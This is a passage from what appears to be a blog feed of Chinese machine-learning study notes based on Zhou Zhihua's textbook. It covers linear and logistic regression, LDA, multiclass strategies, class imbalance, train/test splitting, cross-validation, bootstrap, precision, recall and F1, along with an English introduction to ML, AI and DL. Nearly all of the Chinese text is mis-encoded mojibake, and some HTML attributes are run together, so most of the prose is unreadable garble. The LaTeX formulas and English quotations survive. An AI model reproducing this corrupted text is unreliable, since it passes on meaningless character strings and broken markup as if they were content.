"ä½",å¯è½¬åŒ–ä¸º{1.0ï¼Œ0.5ï¼Œ0.0};</p><p>è‹¥å±æ€§å€¼é—´ä¸å­˜åœ¨åºå…³ç³»ï¼Œå‡å®šæœ‰ k ä¸ªå±æ€§å€¼ï¼Œåˆ™é€šå¸¸è½¬åŒ–ä¸º kç»´å‘é‡ï¼Œä¾‹å¦‚å±æ€§â€œç“œç±»â€çš„å–å€¼"è¥¿ç“œ"ã€"å—ç“œ"ã€"é»„ç“œ"å¯è½¬åŒ–ä¸º(0,0,1)ï¼Œ(0,1,0)ï¼Œ(1,0,0)ã€‚</p><p>è‹¥å°†æ— åºå±æ€§è¿ç»­åŒ–ï¼Œåˆ™ä¼šä¸æ°å½“åœ°å¼•å…¥åºå…³ç³»ï¼Œå¯¹åç»­å¤„ç†å¦‚è·ç¦»è®¡ç®—ç­‰é€ æˆè¯¯å¯¼</p></li><li><p>æœ€å°äºŒä¹˜æ³•</p><p>å‡æ–¹è¯¯å·®æ˜¯å›å½’ä»»åŠ¡ä¸­æœ€å¸¸ç”¨çš„æ€§èƒ½åº¦é‡ï¼Œå› æ­¤æˆ‘ä»¬å¯è¯•å›¾è®©å‡æ–¹è¯¯å·®æœ€å°åŒ–ã€‚å‡æ–¹è¯¯å·®å¯¹åº”äº†æ¬§å‡ é‡Œå¾—è·ç¦»æˆ–ç®€ç§°"æ¬§æ°è·ç¦»"(Euclideandistance)ã€‚åŸºäºå‡æ–¹è¯¯å·®æœ€å°åŒ–æ¥è¿›è¡Œæ¨¡å‹æ±‚è§£çš„æ–¹æ³•ç§°ä¸º"æœ€å°äºŒä¹˜æ³•" (leastsquare method).</p><p>åœ¨çº¿æ€§å›å½’ä¸­ï¼Œæœ€å° Aä¹˜æ³•å°±æ˜¯è¯•å›¾æ‰¾åˆ°ä¸€æ¡ç›´çº¿ï¼Œä½¿æ‰€æœ‰æ ·æœ¬åˆ°ç›´çº¿ä¸Šçš„æ¬§æ°è·ç¦»ä¹‹å’Œæœ€å°ã€‚</p><p>æ±‚è§£ Ï‰ å’Œ b ä½¿<span class="math inline">\(E_{(w,b)}=\sum_{i=1}^{m}\left(y_{i}-wx_{i}-b\right)^{2}\)</span>æœ€å°åŒ–çš„è¿‡ç¨‹ï¼Œç§°ä¸ºçº¿æ€§å›å½’æ¨¡å‹çš„æœ€å°äºŒä¹˜â€œå‚æ•°ä¼°è®¡â€(parameter estimation).</p><p><span class="math display">\[\begin{aligned}\left(w^{*}, b^{*}\right) &amp;=\underset{(w, b)}{\arg \min }\sum_{i=1}^{m}\left(f\left(x_{i}\right)-y_{i}\right)^{2} \\&amp;=\underset{(w, b)}{\arg \min } \sum_{i=1}^{m}\left(y_{i}-wx_{i}-b\right)^{2}\end{aligned}\]</span></p></li><li><p>å¯¹æ•°çº¿æ€§å›å½’ä¸å¹¿ä¹‰çº¿æ€§å›å½’ <span class="math inline">\(\lny=\boldsymbol{w}^{\mathrm{T}} \boldsymbol{x}+b\)</span></p><p>è¯¥å¼åœ¨å½¢å¼ä¸Šä»æ˜¯çº¿æ€§å›å½’ï¼Œä½†å®è´¨ä¸Šå·²æ˜¯åœ¨æ±‚å–è¾“å…¥ç©ºé—´åˆ°è¾“å‡ºç©ºé—´çš„éçº¿æ€§å‡½æ•°æ˜ å°„ã€‚è¿™é‡Œçš„å¯¹æ•°å‡½æ•°èµ·åˆ°äº†å°†çº¿æ€§å›å½’æ¨¡å‹çš„é¢„æµ‹å€¼ä¸çœŸå®æ ‡è®°è”ç³»èµ·æ¥çš„ä½œç”¨ã€‚</p><p>è€ƒè™‘å•è°ƒå¯å¾®å‡½æ•°<span class="math inline">\(g(\cdot)\)</span>ï¼Œä»¤<span class="math inline">\(y=g^{-1}\left(\boldsymbol{w}^{\mathrm{T}}\boldsymbol{x}+b\right)\)</span> è¿™æ ·å¾—åˆ°çš„æ¨¡å‹ç§°ä¸º"å¹¿ä¹‰çº¿æ€§æ¨¡å‹"(generalized linear model) ï¼Œå…¶ä¸­å‡½æ•°å¹¿ä¹‰çº¿æ€§ç¥ºå‹çš„å‚æ•°ä¼°<spanclass="math inline">\(g(\cdot)\)</span>ç§°ä¸º"è”ç³»å‡½æ•°" (link function).æ˜¾ç„¶,å¯¹æ•°çº¿æ€§å›å½’æ˜¯å¹¿ä¹‰çº¿æ€§æ¨¡å‹åœ¨<span class="math inline">\(g(\cdot) =ln( \cdot )\)</span>æ—¶çš„ç‰¹ä¾‹ã€‚</p></li></ol><h2 id="å¯¹æ•°å‡ ç‡å›å½’">å¯¹æ•°å‡ ç‡å›å½’</h2><p>å¹¿ä¹‰çº¿æ€§æ¨¡å‹ä¸­.åªéœ€æ‰¾ä¸€ä¸ªå•è°ƒå¯å¾®å‡½æ•°å°†åˆ†ç±»ä»»åŠ¡çš„çœŸå®æ ‡è®°<spanclass="math inline">\(y\)</span>ä¸çº¿æ€§å›å½’æ¨¡å‹çš„é¢„æµ‹å€¼è”ç³»èµ·æ¥ã€‚å€¼.æœ€ç†æƒ³çš„æ˜¯"å•ä½é˜¶è·ƒå‡½æ•°" (unit-step function)ï¼Œä½†æ˜¯å•ä½é˜¶è·ƒå‡½æ•°ä¸è¿ç»­ã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16267070936674.jpg"alt="å•ä½é˜¶è·ƒå‡½æ•°" /></p><p>å¯¹æ•°å‡ ç‡å‡½æ•°(logistic function) æ­£æ˜¯è¿™æ ·ä¸€ä¸ªå¸¸ç”¨çš„æ›¿ä»£å‡½æ•°: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16267071371754.jpg"alt="logistic function" /></p><p>Sigmoid å‡½æ•°å³å½¢ä¼¼ S çš„å‡½æ•°ï¼Œå¯¹ç‡å‡½æ•°æ˜¯ Sigmiodå‡½æ•°çš„æœ€é‡è¦çš„ä»£è¡¨ã€‚å¯¹æ•°å‡ ç‡å‡½æ•°æ˜¯ä¸€ç§ "Sigmoid å‡½æ•°"ï¼Œå®ƒå°† zå€¼è½¬åŒ–ä¸ºä¸€ä¸ªæ¥è¿‘ 0 æˆ– 1 çš„ <span class="math inline">\(y\)</span>å€¼,å¹¶ä¸”å…¶è¾“å‡ºå€¼åœ¨ z=0 é™„è¿‘å˜åŒ–å¾ˆé™¡ã€‚</p><p>è¿™å®é™…ä¸Šæ˜¯åœ¨ç”¨çº¿æ€§å›å½’æ¨¡å‹çš„é¢„æµ‹ç»“æœå»é€¼è¿‘çœŸå®æ ‡è®°çš„å¯¹æ•°å‡ ç‡ï¼Œå› æ­¤ï¼Œå…¶å¯¹åº”çš„æ¨¡å‹ç§°ä¸º"å¯¹æ•°å‡ ç‡å½’"(logistic regressionï¼Œäº¦ç§° logitregression)ã€‚ç‰¹åˆ«éœ€æ³¨æ„åˆ°ï¼Œ<strong>è™½ç„¶å®ƒçš„åå­—æ˜¯"å›å½’"ï¼Œä½†å®é™…å´æ˜¯ä¸€ç§åˆ†ç±»å­¦ä¹ æ–¹æ³•</strong>ã€‚è¿™ç§æ–¹æ³•æœ‰å¾ˆå¤šä¼˜ç‚¹ï¼Œä¾‹å¦‚å®ƒæ˜¯ç›´æ¥å¯¹åˆ†ç±»å¯èƒ½æ€§è¿›è¡Œå»ºæ¨¡ï¼Œæ— éœ€äº‹å…ˆå‡è®¾æ•°æ®åˆ†å¸ƒï¼Œè¿™æ ·å°±é¿å…äº†å‡è®¾åˆ†å¸ƒä¸å‡†ç¡®æ‰€å¸¦æ¥çš„é—®é¢˜;å®ƒä¸æ˜¯ä»…é¢„æµ‹å‡º"ç±»åˆ«"ï¼Œè€Œæ˜¯å¯å¾—åˆ°è¿‘ä¼¼æ¦‚ç‡é¢„æµ‹ï¼Œè¿™å¯¹è®¸å¤šéœ€åˆ©ç”¨æ¦‚ç‡è¾…åŠ©å†³ç­–çš„ä»»åŠ¡å¾ˆæœ‰ç”¨ï¼›æ­¤å¤–ï¼Œå¯¹ç‡å‡½æ•°æ˜¯ä»»æ„é˜¶å¯å¯¼çš„å‡¸å‡½æ•°ï¼Œæœ‰å¾ˆå¥½çš„æ•°å­¦æ€§è´¨ï¼Œç°æœ‰çš„è®¸å¤šæ•°å€¼ä¼˜åŒ–ç®—æ³•éƒ½å¯ç›´æ¥ç”¨äºæ±‚å–æœ€ä¼˜è§£.</p><h2 id="çº¿æ€§åˆ¤åˆ«åˆ†æ">çº¿æ€§åˆ¤åˆ«åˆ†æ</h2><p>çº¿æ€§åˆ¤åˆ«åˆ†æ(Linear Discriminant Analysisï¼Œç®€ç§° LDA)æ˜¯ä¸€ç§ç»å…¸çš„çº¿æ€§å­¦ä¹ æ–¹æ³•ï¼Œäº¦ç§°"Fisher åˆ¤åˆ«åˆ†æâ€ã€‚ LDA çš„æ€æƒ³éå¸¸æœ´ç´ :ç»™å®šè®­ç»ƒæ ·ä¾‹é›†ï¼Œè®¾æ³•å°†æ ·ä¾‹æŠ•å½±åˆ°ä¸€æ¡ç›´çº¿ä¸Šï¼Œä½¿å¾—åŒç±»æ ·ä¾‹çš„æŠ•å½±ç‚¹å°½å¯èƒ½æ¥è¿‘ã€å¼‚ç±»æ ·ä¾‹çš„æŠ•å½±ç‚¹å°½å¯èƒ½è¿œç¦»;åœ¨å¯¹æ–°æ ·æœ¬è¿›è¡Œåˆ†ç±»æ—¶ï¼Œå°†å…¶æŠ•å½±åˆ°åŒæ ·çš„è¿™æ¡ç›´çº¿ä¸Šï¼Œå†æ ¹æ®æŠ•å½±ç‚¹çš„ä½ç½®æ¥ç¡®å®šæ–°æ ·æœ¬çš„ç±»åˆ«.</p><h2 id="å¤šåˆ†ç±»å­¦ä¹ ">å¤šåˆ†ç±»å­¦ä¹ </h2><p>å¤šåˆ†ç±»å­¦ä¹ ä»»åŠ¡.æœ‰äº›äºŒåˆ†ç±»å­¦ä¹ æ–¹æ³•å¯ç›´æ¥æ¨å¹¿åˆ°å¤šåˆ†ç±»ï¼Œä½†åœ¨æ›´å¤šæƒ…å½¢ä¸‹ï¼Œæˆ‘ä»¬æ˜¯åŸºäºä¸€äº›åŸºæœ¬ç­–ç•¥ï¼Œåˆ©ç”¨äºŒåˆ†ç±»å­¦ä¹ å™¨æ¥è§£å†³å¤šåˆ†ç±»é—®é¢˜ã€‚è€ƒè™‘ N ä¸ªç±»åˆ«<span class="math inline">\(C_{1}, C_{2}, \ldots,C_{N}\)</span>ï¼Œå¤šåˆ†ç±»å­¦ä¹ çš„åŸºæœ¬æ€è·¯æ˜¯"æ‹†è§£æ³•â€œï¼Œå³å°†å¤šåˆ†ç±»ä»»åŠ¡æ‹†ä¸ºè‹¥å¹²ä¸ªäºŒåˆ†ç±»ä»»åŠ¡æ±‚è§£ã€‚å…·ä½“æ¥è¯´ï¼Œå…ˆå¯¹é—®é¢˜è¿›è¡Œæ‹†åˆ†ï¼Œç„¶åä¸ºæ‹†å‡ºçš„æ¯ä¸ªäºŒåˆ†ç±»ä»»åŠ¡è®­ç»ƒä¸€ä¸ªåˆ†ç±»å™¨ï¼›åœ¨æµ‹è¯•æ—¶ï¼Œå¯¹è¿™äº›åˆ†ç±»å™¨çš„é¢„æµ‹ç»“æœè¿›è¡Œé›†æˆä»¥è·å¾—æœ€ç»ˆçš„å¤šåˆ†ç±»ç»“æœã€‚è¿™é‡Œçš„å…³é”®æ˜¯å¦‚ä½•å¯¹å¤šåˆ†ç±»ä»»åŠ¡è¿›è¡Œæ‹†åˆ†ï¼Œä»¥åŠå¦‚ä½•å¯¹å¤šä¸ªåˆ†ç±»å™¨è¿›è¡Œé›†æˆã€‚æœ€ç»å…¸çš„æ‹†åˆ†ç­–ç•¥æœ‰ä¸‰ç§ï¼š"ä¸€å¯¹ä¸€" (One vs. Oneï¼Œç®€ç§° OvO)ã€"ä¸€å¯¹å…¶ä½™"(One vs. Rest ï¼Œç®€ç§° OvR)å’Œ"å¤šå¯¹å¤š" (Many vs. Manyï¼Œç®€ç§° MvM).</p><h2 id="ç±»åˆ«ä¸å¹³è¡¡é—®é¢˜">ç±»åˆ«ä¸å¹³è¡¡é—®é¢˜</h2><p>ç±»åˆ«ä¸å¹³è¡¡(class-imbalance)å°±æ˜¯æŒ‡åˆ†ç±»ä»»åŠ¡ä¸­ä¸åŒç±»åˆ«çš„è®­ç»ƒæ ·ä¾‹æ•°ç›®å·®åˆ«å¾ˆå¤§çš„æƒ…å†µã€‚ç±»åˆ«ä¸å¹³è¡¡æ€§å¤„ç†çš„åŸºæœ¬æ–¹æ³•ï¼šè¿™å°±æ˜¯ç±»åˆ«ä¸å¹³è¡¡å­¦ä¹ çš„ä¸€ä¸ªåŸºæœ¬ç­–ç•¥ä¸€"å†ç¼©æ”¾"(rescaling)/â€å†å¹³è¡¡ï¼ˆrebalanceï¼‰â€</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">å‘¨å¿—åæœºå™¨å­¦ä¹ </a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ æ ·æœ¬è¯„ä¼°ä¸é€‰æ‹©</title>
      <link href="/blog/2021/07/18/ml/3.sample_evaluation/"/>
      <url>/blog/2021/07/18/ml/3.sample_evaluation/</url>
      
        <content type="html"><![CDATA[<h2 id="ç»éªŒè¯¯å·®ä¸è¿‡æ‹Ÿåˆ">ç»éªŒè¯¯å·®ä¸è¿‡æ‹Ÿåˆ</h2><p>æœºå™¨å­¦ä¹ çš„ç›®æ ‡ï¼šæ³›åŒ–è¯¯å·®å°</p><ul><li>ç²¾åº¦=1-é”™è¯¯ç‡=1-é”™è¯¯æ ·æœ¬æ•°/æ€»æ ·æœ¬æ•°</li><li>è¯¯å·®ï¼ˆerrorï¼‰ï¼šå­¦ä¹ å™¨çš„å®é™…é¢„æµ‹è¾“å‡ºå’Œæ ·æœ¬çš„çœŸå®æ ‡è®°ä¹‹é—´çš„å·®å¼‚</li><li>å­¦ä¹ å™¨åœ¨è®­ç»ƒé›†ä¸Šçš„è¯¯å·®ç§°ä¸ºâ€œè®­ç»ƒè¯¯å·®â€ï¼ˆtrainingerrorï¼‰æˆ–â€œç»éªŒè¯¯å·®â€ï¼ˆempirical errorï¼‰</li><li>è®­ç»ƒè¯¯å·®ï¼ˆtraning errorï¼‰ï¼šå­¦ä¹ å™¨åœ¨è®­ç»ƒé›†ä¸Šçš„è¯¯å·®ï¼Œä¹Ÿç§°ç»éªŒè¯¯å·®</li><li>æ³›åŒ–è¯¯å·®ï¼ˆgeneralizationerrorï¼‰ï¼šåœ¨æ–°æ ·æœ¬ä¸Šçš„è¯¯å·®ã€‚æ˜¾ç„¶ï¼Œæˆ‘ä»¬å¸Œæœ›å¾—åˆ°æ³›åŒ–è¯¯å·®å°çš„å­¦ä¹ å™¨ã€‚</li><li>æµ‹è¯•è¯¯å·®ï¼ˆtesting errorï¼‰ï¼šç”¨æ¥<strong>è¿‘ä¼¼</strong>æ³›åŒ–è¯¯å·®</li><li>æ¨¡å‹é€‰æ‹©ï¼ˆmodelselectionï¼‰é—®é¢˜ï¼šç†æƒ³çš„è§£å†³æ–¹æ¡ˆå½“ç„¶æ˜¯å¯¹å€™é€‰æ¨¡å‹çš„æ³›åŒ–è¯¯å·®è¿›è¡Œè¯„ä¼°ï¼Œç„¶åé€‰æ‹©æ³›åŒ–è¯¯å·®æœ€å°çš„é‚£ä¸ªæ¨¡å‹ã€‚</li><li>è¿‡æ‹Ÿåˆï¼ˆOverfittingï¼‰ï¼šå­¦ä¹ å™¨å°†è®­ç»ƒæ ·æœ¬å­¦çš„å¤ªå¥½ï¼Œå°†æ ·æœ¬è‡ªèº«çš„ä¸€äº›ç‰¹ç‚¹å½“ä½œäº†æ‰€æœ‰æ½œåœ¨æ ·æœ¬éƒ½ä¼šå…·æœ‰çš„ä¸€èˆ¬æ€§è´¨ï¼Œå¯¼è‡´æ³›åŒ–æ€§èƒ½ä¸‹é™ã€‚<strong>è¿‡æ‹Ÿåˆæ— æ³•é¿å…åªèƒ½ç¼“è§£</strong></li><li>æ¬ æ‹Ÿåˆï¼ˆUnderfittingï¼‰ï¼šå­¦ä¹ å™¨å­¦ä¹ èƒ½åŠ›ä½ä¸‹é€ æˆ</li></ul><h2 id="è¯„ä¼°æ–¹æ³•">è¯„ä¼°æ–¹æ³•</h2><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯é€šè¿‡å®éªŒæµ‹è¯•æ¥å¯¹å­¦ä¹ å™¨çš„æ³›åŒ–è¯¯å·®è¿›è¡Œè¯„ä¼°å¹¶è¿›è€Œåšå‡ºé€‰æ‹©.ä¸ºæ­¤ï¼Œéœ€ä½¿ç”¨ä¸€ä¸ªâ€œæµ‹è¯•é›†â€ï¼ˆtestingsetï¼‰æ¥æµ‹è¯•å­¦ä¹ å™¨å¯¹æ–°æ ·æœ¬çš„åˆ¤åˆ«èƒ½åŠ›ï¼Œç„¶åä»¥æµ‹è¯•é›†ä¸Šçš„â€œæµ‹è¯•è¯¯å·®â€ï¼ˆtestingerrorï¼‰ä½œä¸ºæ³›åŒ–è¯¯å·®çš„è¿‘ä¼¼.é€šå¸¸æˆ‘ä»¬å‡è®¾æµ‹è¯•æ ·æœ¬ä¹Ÿæ˜¯ä»æ ·æœ¬çœŸå®åˆ†å¸ƒä¸­ç‹¬ç«‹åŒåˆ†å¸ƒé‡‡æ ·è€Œå¾—ï¼Œä½†éœ€æ³¨æ„çš„æ˜¯ï¼Œæµ‹è¯•é›†åº”è¯¥å°½å¯èƒ½ä¸è®­ç»ƒé›†äº’æ–¥ï¼Œå³**æµ‹è¯•æ ·æœ¬å°½é‡ä¸åœ¨è®­ç»ƒé›†ä¸­å‡ºç°ã€æœªåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä½¿ç”¨è¿‡ã€‚</p><h2 id="æµ‹è¯•é›†å’Œè®­ç»ƒé›†åˆ’åˆ†æ–¹æ³•">æµ‹è¯•é›†å’Œè®­ç»ƒé›†åˆ’åˆ†æ–¹æ³•</h2><ol type="1"><li><p>ç•™å‡ºæ³•(hold-out) ç›´æ¥å°†æ•°æ®é›† D åˆ’åˆ†ä¸ºä¸¤ä¸ªäº’æ–¥çš„é›†åˆ</p><ul><li>ä¿æŒæ•°æ®åˆ†å¸ƒçš„ä¸€è‡´æ€§ï¼Œ<strong>ä¿æŒç”¨äºå­¦ä¹ çš„æ•°æ®é›†ä¸ç”¨äºæµ‹è¯•çš„æ•°æ®é›†çš„åˆ†å¸ƒç‰¹å¾ä¸€è‡´</strong>ï¼ˆä¾‹å¦‚ï¼šåˆ†å±‚é‡‡æ ·ï¼‰</li><li>å¤šæ¬¡é‡å¤åˆ’åˆ†</li><li>æµ‹è¯•é›†ä¸èƒ½å¤ªå¤§ï¼Œä¹Ÿä¸èƒ½å¤ªå°ï¼ˆä¸€èˆ¬ 1/5 ï½ 1/3ï¼‰</li></ul></li><li><p>äº¤å‰éªŒè¯æ³•ï¼ˆcross validationï¼‰ å…ˆå°†æ•°æ®é›† D åˆ’åˆ†ä¸º kä¸ªå¤§å°ç›¸ä¼¼çš„äº’æ–¥å­é›†,ç„¶åæ¯æ¬¡ç”¨ k-1ä¸ªå­é›†çš„å¹¶é›†ä½œä¸ºè®­ç»ƒé›†ï¼Œä½™ä¸‹çš„é‚£ä¸ªå­é›†ä½œä¸ºæµ‹è¯•é›†ï¼›è¿™æ ·å°±å¯è·å¾— kç»„è®­ç»ƒ/æµ‹è¯•é›†ï¼Œä»è€Œå¯è¿›è¡Œ k æ¬¡è®­ç»ƒå’Œæµ‹è¯•ï¼Œæœ€ç»ˆè¿”å›çš„æ˜¯è¿™ kä¸ªæµ‹è¯•ç»“æœçš„å‡å€¼ã€‚ä¸ºå¼ºè°ƒ k çš„å–å€¼é‡è¦æ€§ï¼Œé€šå¸¸æŠŠäº¤å‰éªŒè¯æ³•ç§°ä¸ºâ€œkæŠ˜äº¤å‰éªŒè¯â€ï¼ˆk-fold crossvalidationï¼‰ã€‚k æœ€å¸¸ç”¨çš„å–å€¼æ˜¯ 10ï¼Œæ­¤æ—¶ç§°ä¸º 10æŠ˜äº¤å‰éªŒè¯ï¼›å…¶ä»–å¸¸ç”¨çš„ k å€¼æœ‰ 5ã€20 ç­‰ã€‚</p><ul><li>ç•™å‡ºæ³•æ€»å½’æ˜¯ä½¿ç”¨äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼Œæ²¡æœ‰æµ‹è¯•å…¨éƒ¨æ•°æ®ï¼Œå› æ­¤ kæŠ˜äº¤å‰éªŒè¯å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li><li>å‡è®¾å°†æ•°æ®é›†åˆ†æˆ k = 10 ä»½ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨ D10 ä½œä¸ºæµ‹è¯•é›†ï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨ D9ä½œä¸ºæµ‹è¯•é›†ï¼Œç›´è‡³æ¯ä¸ªéƒ½å½“è¿‡æµ‹è¯•é›†ï¼Œç„¶åå°† kä¸ªç»“æœæ±‚å¹³å‡ï¼Œå°±æ˜¯æœ€ç»ˆç»“æœã€‚</li></ul></li><li><p>è‡ªåŠ©æ³•ï¼ˆbootstrap ï¼‰</p><ul><li>åŸºäºâ€è‡ªåŠ©é‡‡æ ·â€œçš„æ–¹æ³•ï¼Œä¹Ÿç§°ï¼šâ€œæœ‰æ”¾å›é‡‡æ ·â€ã€â€œå¯é‡å¤é‡‡æ ·â€</li><li>å¯¹æ•°æ®é›†è¿›è¡Œæœ‰æ”¾å›é‡‡æ ·ï¼Œå¹¶ä¸”é‡‡æ ·å‡ºçš„é›†åˆä¸åŸæ ·æœ¬é›†åŒè§„æ¨¡ï¼Œä½†æ˜¯æ•°æ®åˆ†å¸ƒæœ‰æ‰€æ”¹å˜</li></ul></li></ol><h2 id="è°ƒå‚ä¸æœ€ç»ˆæ¨¡å‹">è°ƒå‚ä¸æœ€ç»ˆæ¨¡å‹</h2><p>ç°å®ä¸­å¸¸ç”¨çš„åšæ³•ï¼šå¯¹æ¯ä¸ªå‚æ•°é€‰å®šä¸€ä¸ªèŒƒå›´å’Œå˜åŒ–æ­¥é•¿ï¼Œä¾‹å¦‚åœ¨[0ï¼Œ0.2]èŒƒå›´å†…ä»¥ 0.05 ä¸ºæ­¥é•¿ï¼Œåˆ™å®é™…è¦è¯„ä¼°çš„å€™é€‰å‚æ•°å€¼æœ‰ 5 ä¸ªï¼Œæœ€ç»ˆæ˜¯ä»è¿™ 5ä¸ªå€™é€‰å€¼ä¸­äº§ç”Ÿé€‰å®šå€¼.è¿™æ˜¯åœ¨è®¡ç®—å¼€é”€å’Œæ€§èƒ½ä¼°è®¡ä¹‹é—´è¿›è¡ŒæŠ˜ä¸­çš„ç»“æœï¼Œé€šè¿‡è¿™ä¸ªæŠ˜ä¸­ï¼Œå­¦ä¹ è¿‡ç¨‹æ‰å˜å¾—å¯è¡Œã€‚å‚æ•°è°ƒå¾—å¥½ä¸å¥½å¾€å¾€å¯¹æœ€ç»ˆæ¨¡å‹æ€§èƒ½æœ‰å…³é”®æ€§å½±å“.</p><h3 id="æ€§èƒ½åº¦é‡">æ€§èƒ½åº¦é‡</h3><p>å›å½’ä»»åŠ¡æœ€å¸¸ç”¨çš„æ€§èƒ½åº¦é‡æ˜¯â€œå‡æ–¹è¯¯å·®â€ï¼ˆmean squared errorï¼‰</p><p>åˆ†ç±»ä»»åŠ¡ä¸­å¸¸ç”¨çš„æ€§èƒ½åº¦é‡ï¼š</p><ol type="1"><li><p>é”™è¯¯åº¦ä¸ç²¾åº¦ï¼ˆaccuracyï¼‰ é”™è¯¯ç‡æ˜¯åˆ†ç±»é”™è¯¯çš„æ ·æœ¬æ•°å æ ·æœ¬æ€»æ•°çš„æ¯”ä¾‹ç²¾åº¦åˆ™æ˜¯åˆ†ç±»æ­£ç¡®çš„æ ·æœ¬æ•°å æ ·æœ¬æ€»æ•°çš„æ¯”ä¾‹</p></li><li><p>æŸ¥å‡†ç‡ï¼ˆprecisionï¼‰ä¸æŸ¥å…¨ç‡ï¼ˆrecallï¼‰æŸ¥å‡†ç‡ï¼šåœ¨æ‰€é¢„æµ‹ç±»åˆ«ä¸­ï¼Œé¢„æµ‹æ­£ç¡®çš„æ¯”ä¾‹ï¼Œåˆ†æ¯æ˜¯é¢„æµ‹ç±»åˆ«çš„æ ·æœ¬æ•°ã€‚ä¾‹å¦‚ï¼šæŒ‘å‡ºçš„è¥¿ç“œä¸­ï¼Œæœ‰å¤šå°‘æ¯”ä¾‹æ˜¯å¥½ç“œæŸ¥å…¨ç‡ï¼šåœ¨çœŸå®ç±»åˆ«ä¸­ï¼Œé¢„æµ‹æ­£ç¡®çš„æ¯”ä¾‹ï¼Œåˆ†æ¯æ˜¯çœŸå®ç±»åˆ«çš„æ ·æœ¬æ•°ã€‚ä¾‹å¦‚ï¼šæ‰€æœ‰å¥½ç“œä¸­æœ‰å¤šå°‘æ¯”ä¾‹è¢«æŒ‘äº†å‡ºæ¥</p><p>å¯¹äºäºŒåˆ†ç±»é—®é¢˜ï¼Œå¯å°†æ ·ä¾‹æ ¹æ®å…¶çœŸå®ç±»åˆ«ä¸å­¦ä¹ å™¨é¢„æµ‹ç±»åˆ«çš„ç»„åˆåˆ’åˆ†ä¸ºçœŸæ­£ä¾‹ï¼ˆtruepositiveï¼‰ã€å‡æ­£ä¾‹ï¼ˆfalse positiveï¼‰ã€çœŸåä¾‹ï¼ˆtruenegativeï¼‰ã€å‡åä¾‹ï¼ˆfalse negativeï¼‰å››ç§æƒ…å½¢ï¼Œä»¤ TPã€FPã€TNã€FNåˆ†åˆ«è¡¨ç¤ºå…¶å¯¹åº”çš„æ ·ä¾‹æ•°ï¼Œåˆ™æ˜¾ç„¶æœ‰TP+FP+TN+FN=æ ·ä¾‹æ€»æ•°ã€‚åˆ†ç±»ç»“æœçš„â€œæ··æ·†çŸ©é˜µâ€ï¼ˆconfusion matrixï¼‰å¦‚ä¸‹ï¼š<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16307367050186.jpg"alt="16307367050186" /></p><p><span class="math inline">\(P=\frac{T P}{T P+F P}\)</span> <spanclass="math inline">\(R=\frac{T P}{T P+F N}\)</span></p></li></ol><p>ä»¥æŸ¥å‡†ç‡ä¸ºçºµè½´ã€æŸ¥å…¨ç‡ä¸ºæ¨ªè½´ä½œå›¾ï¼Œå°±å¾—åˆ°äº†æŸ¥å‡†ç‡-æŸ¥å…¨ç‡æ›²çº¿ï¼Œç®€ç§° P-Ræ›²çº¿ã€‚</p><p><span class="math display">\[F1=\frac{2 \times P \times R}{P+R}=\frac{2 \times TP}{\text { æ ·ä¾‹æ€»æ•°}+TP-TN}\]</span></p><p>F1 åº¦é‡çš„ä¸€èˆ¬å½¢å¼ <span class="math inline">\(F_{\beta}\)</span>èƒ½è®©æˆ‘ä»¬è¡¨è¾¾å‡ºå¯¹æŸ¥å‡†ç‡/æŸ¥å…¨ç‡çš„ä¸åŒåå¥½ã€‚</p><p><span class="math display">\[F_{\beta}=\frac{\left(1+\beta^{2}\right)\times P \times R}{\left(\beta^{2} \times P\right)+R}\]</span></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">å‘¨å¿—åæœºå™¨å­¦ä¹ </a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ æ¦‚è¿°</title>
      <link href="/blog/2021/07/15/ml/0.%20ml_intro/"/>
      <url>/blog/2021/07/15/ml/0.%20ml_intro/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦ä»‹ç»æœºå™¨å­¦ä¹ çš„æ¦‚å¿µã€åˆ†ç±»ä¸ç›¸å…³å­¦ä¹ èµ„æ–™</p><h2 id="å‘å±•å†å²">å‘å±•å†å²</h2><ol type="1"><li><p><strong>machine learning</strong> as a "<strong>field ofstudy</strong> that gives computers the ability to learn without beingexplicitly programmed --Arthur Samuel</p></li><li><p><strong>Well-Posed Learning Problems</strong></p><p>A <strong>computer</strong> program is said to <strong>learn</strong>from experience E with respect to some class of tasks T and performancemeasure P, if its performance at tasks in T, as measured by P, improveswith experience E. --Tom Mitchell</p></li></ol><h3 id="alml-å’Œ-dl">ALã€ML å’Œ DL</h3><p>AI is really a broad term and somewhat this also causes every companyto claim their product has AI these days. Then ML is a subset of AI, andconsists of the more advanced techniques and models that enablecomputers to figure things out from the data and deliver AIapplications. ML is the science of getting computers to act withoutbeing explicitly programmed.</p><p>Finally, DL is a newer area of ML that that uses multi-layeredartificial neural networks to deliver high accuracy in tasks such asobject detection, speech recognition, language translation and otherrecent breakthroughs that you hear in the news.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/2021020816127886102281.png"alt="å‘å±•å†ç¨‹" /><figcaption aria-hidden="true">å‘å±•å†ç¨‹</figcaption></figure><h2 id="æœºå™¨å­¦ä¹ ç®—æ³•åˆ†ç±»">æœºå™¨å­¦ä¹ ç®—æ³•åˆ†ç±»</h2><p>æ ¹æ®è®­ç»ƒæ•°æ®æ˜¯å¦æ‹¥æœ‰æ ‡è®°ä¿¡æ¯ï¼Œå­¦ä¹ 